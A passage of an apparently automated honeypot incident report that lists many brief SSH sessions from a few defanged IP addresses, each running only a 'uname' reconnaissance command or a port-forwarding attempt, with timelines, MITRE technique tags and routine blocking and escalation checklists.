| `2026-07-26 22:41:40` | `cowrie.client.version` |
| `2026-07-26 22:41:40` | `cowrie.client.kex` |
| `2026-07-26 22:41:41` | `cowrie.login.success` |
| `2026-07-26 22:41:41` | `cowrie.session.params` |
| `2026-07-26 22:41:41` | `cowrie.command.input` |
| `2026-07-26 22:41:41` | `cowrie.log.closed` |
| `2026-07-26 22:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b043b5b698

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:43 |
| **Last Seen** | 2026-07-26 22:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:43:17` | `cowrie.session.connect` |
| `2026-07-26 22:43:17` | `cowrie.client.version` |
| `2026-07-26 22:43:17` | `cowrie.client.kex` |
| `2026-07-26 22:43:17` | `cowrie.login.success` |
| `2026-07-26 22:43:18` | `cowrie.session.params` |
| `2026-07-26 22:43:18` | `cowrie.command.input` |
| `2026-07-26 22:43:18` | `cowrie.log.closed` |
| `2026-07-26 22:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8c55d3db78e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 22:44 |
| **Last Seen** | 2026-07-26 22:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:44:18` | `cowrie.session.connect` |
| `2026-07-26 22:44:18` | `cowrie.client.version` |
| `2026-07-26 22:44:18` | `cowrie.client.kex` |
| `2026-07-26 22:44:19` | `cowrie.login.success` |
| `2026-07-26 22:44:19` | `cowrie.direct-tcpip.request` |
| `2026-07-26 22:44:19` | `cowrie.direct-tcpip.data` |
| `2026-07-26 22:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feef211fb2fd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:44 |
| **Last Seen** | 2026-07-26 22:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:44:57` | `cowrie.session.connect` |
| `2026-07-26 22:44:57` | `cowrie.client.version` |
| `2026-07-26 22:44:57` | `cowrie.client.kex` |
| `2026-07-26 22:44:57` | `cowrie.login.success` |
| `2026-07-26 22:44:58` | `cowrie.session.params` |
| `2026-07-26 22:44:58` | `cowrie.command.input` |
| `2026-07-26 22:44:58` | `cowrie.log.closed` |
| `2026-07-26 22:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a16a05a3f8c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:46 |
| **Last Seen** | 2026-07-26 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:46:37` | `cowrie.session.connect` |
| `2026-07-26 22:46:37` | `cowrie.client.version` |
| `2026-07-26 22:46:37` | `cowrie.client.kex` |
| `2026-07-26 22:46:38` | `cowrie.login.success` |
| `2026-07-26 22:46:39` | `cowrie.session.params` |
| `2026-07-26 22:46:39` | `cowrie.command.input` |
| `2026-07-26 22:46:39` | `cowrie.log.closed` |
| `2026-07-26 22:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc51d136432

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:48 |
| **Last Seen** | 2026-07-26 22:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:48:15` | `cowrie.session.connect` |
| `2026-07-26 22:48:15` | `cowrie.client.version` |
| `2026-07-26 22:48:15` | `cowrie.client.kex` |
| `2026-07-26 22:48:15` | `cowrie.login.success` |
| `2026-07-26 22:48:16` | `cowrie.session.params` |
| `2026-07-26 22:48:16` | `cowrie.command.input` |
| `2026-07-26 22:48:16` | `cowrie.log.closed` |
| `2026-07-26 22:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ec8b89c258

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:49 |
| **Last Seen** | 2026-07-26 22:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:49:54` | `cowrie.session.connect` |
| `2026-07-26 22:49:54` | `cowrie.client.version` |
| `2026-07-26 22:49:54` | `cowrie.client.kex` |
| `2026-07-26 22:49:55` | `cowrie.login.success` |
| `2026-07-26 22:49:56` | `cowrie.session.params` |
| `2026-07-26 22:49:56` | `cowrie.command.input` |
| `2026-07-26 22:49:56` | `cowrie.log.closed` |
| `2026-07-26 22:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21cd62204ae1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:51 |
| **Last Seen** | 2026-07-26 22:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:51:32` | `cowrie.session.connect` |
| `2026-07-26 22:51:32` | `cowrie.client.version` |
| `2026-07-26 22:51:33` | `cowrie.client.kex` |
| `2026-07-26 22:51:33` | `cowrie.login.success` |
| `2026-07-26 22:51:34` | `cowrie.session.params` |
| `2026-07-26 22:51:34` | `cowrie.command.input` |
| `2026-07-26 22:51:34` | `cowrie.log.closed` |
| `2026-07-26 22:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2038cb11ea3b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:01` | `cowrie.session.connect` |
| `2026-07-26 22:52:01` | `cowrie.client.version` |
| `2026-07-26 22:52:01` | `cowrie.client.kex` |
| `2026-07-26 22:52:01` | `cowrie.login.success` |
| `2026-07-26 22:52:02` | `cowrie.session.params` |
| `2026-07-26 22:52:02` | `cowrie.command.input` |
| `2026-07-26 22:52:02` | `cowrie.log.closed` |
| `2026-07-26 22:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b326fb6ec6a8

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:05` | `cowrie.session.connect` |
| `2026-07-26 22:52:05` | `cowrie.client.version` |
| `2026-07-26 22:52:05` | `cowrie.client.kex` |
| `2026-07-26 22:52:06` | `cowrie.login.success` |
| `2026-07-26 22:52:07` | `cowrie.session.params` |
| `2026-07-26 22:52:07` | `cowrie.command.input` |
| `2026-07-26 22:52:07` | `cowrie.log.closed` |
| `2026-07-26 22:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c731e5f837e6

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:09` | `cowrie.session.connect` |
| `2026-07-26 22:52:09` | `cowrie.client.version` |
| `2026-07-26 22:52:09` | `cowrie.client.kex` |
| `2026-07-26 22:52:10` | `cowrie.login.success` |
| `2026-07-26 22:52:10` | `cowrie.session.params` |
| `2026-07-26 22:52:10` | `cowrie.command.input` |
| `2026-07-26 22:52:11` | `cowrie.log.closed` |
| `2026-07-26 22:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39261892f1dc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:13` | `cowrie.session.connect` |
| `2026-07-26 22:52:13` | `cowrie.client.version` |
| `2026-07-26 22:52:13` | `cowrie.client.kex` |
| `2026-07-26 22:52:14` | `cowrie.login.success` |
| `2026-07-26 22:52:14` | `cowrie.session.params` |
| `2026-07-26 22:52:14` | `cowrie.command.input` |
| `2026-07-26 22:52:15` | `cowrie.log.closed` |
| `2026-07-26 22:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb46ee16204

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:17` | `cowrie.session.connect` |
| `2026-07-26 22:52:17` | `cowrie.client.version` |
| `2026-07-26 22:52:17` | `cowrie.client.kex` |
| `2026-07-26 22:52:18` | `cowrie.login.success` |
| `2026-07-26 22:52:18` | `cowrie.session.params` |
| `2026-07-26 22:52:18` | `cowrie.command.input` |
| `2026-07-26 22:52:18` | `cowrie.log.closed` |
| `2026-07-26 22:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503a8b6ddd55

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:21` | `cowrie.session.connect` |
| `2026-07-26 22:52:21` | `cowrie.client.version` |
| `2026-07-26 22:52:21` | `cowrie.client.kex` |
| `2026-07-26 22:52:21` | `cowrie.login.success` |
| `2026-07-26 22:52:22` | `cowrie.session.params` |
| `2026-07-26 22:52:22` | `cowrie.command.input` |
| `2026-07-26 22:52:22` | `cowrie.log.closed` |
| `2026-07-26 22:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fa9dae873d2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:25` | `cowrie.session.connect` |
| `2026-07-26 22:52:25` | `cowrie.client.version` |
| `2026-07-26 22:52:25` | `cowrie.client.kex` |
| `2026-07-26 22:52:25` | `cowrie.login.success` |
| `2026-07-26 22:52:26` | `cowrie.session.params` |
| `2026-07-26 22:52:26` | `cowrie.command.input` |
| `2026-07-26 22:52:26` | `cowrie.log.closed` |
| `2026-07-26 22:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8506af2085a2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:28` | `cowrie.session.connect` |
| `2026-07-26 22:52:28` | `cowrie.client.version` |
| `2026-07-26 22:52:29` | `cowrie.client.kex` |
| `2026-07-26 22:52:29` | `cowrie.login.success` |
| `2026-07-26 22:52:30` | `cowrie.session.params` |
| `2026-07-26 22:52:30` | `cowrie.command.input` |
| `2026-07-26 22:52:30` | `cowrie.log.closed` |
| `2026-07-26 22:52:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b2246e803d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:32` | `cowrie.session.connect` |
| `2026-07-26 22:52:32` | `cowrie.client.version` |
| `2026-07-26 22:52:32` | `cowrie.client.kex` |
| `2026-07-26 22:52:33` | `cowrie.login.success` |
| `2026-07-26 22:52:34` | `cowrie.session.params` |
| `2026-07-26 22:52:34` | `cowrie.command.input` |
| `2026-07-26 22:52:34` | `cowrie.log.closed` |
| `2026-07-26 22:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac18c9e5b400

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:36` | `cowrie.session.connect` |
| `2026-07-26 22:52:36` | `cowrie.client.version` |
| `2026-07-26 22:52:36` | `cowrie.client.kex` |
| `2026-07-26 22:52:37` | `cowrie.login.success` |
| `2026-07-26 22:52:38` | `cowrie.session.params` |
| `2026-07-26 22:52:38` | `cowrie.command.input` |
| `2026-07-26 22:52:38` | `cowrie.log.closed` |
| `2026-07-26 22:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecf5d858d975

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:40` | `cowrie.session.connect` |
| `2026-07-26 22:52:40` | `cowrie.client.version` |
| `2026-07-26 22:52:40` | `cowrie.client.kex` |
| `2026-07-26 22:52:40` | `cowrie.login.success` |
| `2026-07-26 22:52:41` | `cowrie.session.params` |
| `2026-07-26 22:52:41` | `cowrie.command.input` |
| `2026-07-26 22:52:41` | `cowrie.log.closed` |
| `2026-07-26 22:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-044628ce95ac

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:43` | `cowrie.session.connect` |
| `2026-07-26 22:52:43` | `cowrie.client.version` |
| `2026-07-26 22:52:44` | `cowrie.client.kex` |
| `2026-07-26 22:52:44` | `cowrie.login.success` |
| `2026-07-26 22:52:45` | `cowrie.session.params` |
| `2026-07-26 22:52:45` | `cowrie.command.input` |
| `2026-07-26 22:52:45` | `cowrie.log.closed` |
| `2026-07-26 22:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebff1a756e3

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:47` | `cowrie.session.connect` |
| `2026-07-26 22:52:47` | `cowrie.client.version` |
| `2026-07-26 22:52:47` | `cowrie.client.kex` |
| `2026-07-26 22:52:48` | `cowrie.login.success` |
| `2026-07-26 22:52:48` | `cowrie.session.params` |
| `2026-07-26 22:52:48` | `cowrie.command.input` |
| `2026-07-26 22:52:48` | `cowrie.log.closed` |
| `2026-07-26 22:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db766c04371

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:51` | `cowrie.session.connect` |
| `2026-07-26 22:52:51` | `cowrie.client.version` |
| `2026-07-26 22:52:51` | `cowrie.client.kex` |
| `2026-07-26 22:52:51` | `cowrie.login.success` |
| `2026-07-26 22:52:52` | `cowrie.session.params` |
| `2026-07-26 22:52:52` | `cowrie.command.input` |
| `2026-07-26 22:52:52` | `cowrie.log.closed` |
| `2026-07-26 22:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5495547f0ac7

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:55` | `cowrie.session.connect` |
| `2026-07-26 22:52:55` | `cowrie.client.version` |
| `2026-07-26 22:52:55` | `cowrie.client.kex` |
| `2026-07-26 22:52:55` | `cowrie.login.success` |
| `2026-07-26 22:52:56` | `cowrie.session.params` |
| `2026-07-26 22:52:56` | `cowrie.command.input` |
| `2026-07-26 22:52:56` | `cowrie.log.closed` |
| `2026-07-26 22:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-010b89f6c61e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:52 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:52:58` | `cowrie.session.connect` |
| `2026-07-26 22:52:58` | `cowrie.client.version` |
| `2026-07-26 22:52:58` | `cowrie.client.kex` |
| `2026-07-26 22:52:59` | `cowrie.login.success` |
| `2026-07-26 22:53:00` | `cowrie.session.params` |
| `2026-07-26 22:53:00` | `cowrie.command.input` |
| `2026-07-26 22:53:00` | `cowrie.log.closed` |
| `2026-07-26 22:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-681212e20673

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:02` | `cowrie.session.connect` |
| `2026-07-26 22:53:02` | `cowrie.client.version` |
| `2026-07-26 22:53:02` | `cowrie.client.kex` |
| `2026-07-26 22:53:03` | `cowrie.login.success` |
| `2026-07-26 22:53:03` | `cowrie.session.params` |
| `2026-07-26 22:53:03` | `cowrie.command.input` |
| `2026-07-26 22:53:04` | `cowrie.log.closed` |
| `2026-07-26 22:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e157e609a41b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:06` | `cowrie.session.connect` |
| `2026-07-26 22:53:06` | `cowrie.client.version` |
| `2026-07-26 22:53:06` | `cowrie.client.kex` |
| `2026-07-26 22:53:07` | `cowrie.login.success` |
| `2026-07-26 22:53:07` | `cowrie.session.params` |
| `2026-07-26 22:53:07` | `cowrie.command.input` |
| `2026-07-26 22:53:07` | `cowrie.log.closed` |
| `2026-07-26 22:53:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

